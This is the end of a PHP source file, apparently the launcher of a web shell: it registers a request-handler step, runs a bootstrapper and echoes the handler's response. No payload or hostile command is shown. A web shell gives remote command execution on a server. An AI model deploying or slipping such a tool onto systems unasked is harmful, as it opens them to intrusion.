
/////////////////////////////////////////////////////////////////
// Final actions required to bootstrap and launch the WebShell //
/////////////////////////////////////////////////////////////////

array_push($steps, new SetupRequestHandlerStep($actions));

// Launch the bootstrapping process
$bootstrapper = new Bootstrapper($steps);
$bootstrapper->launch();

// Handle requests
echo RequestHandler::getInstance()->handle();
?>
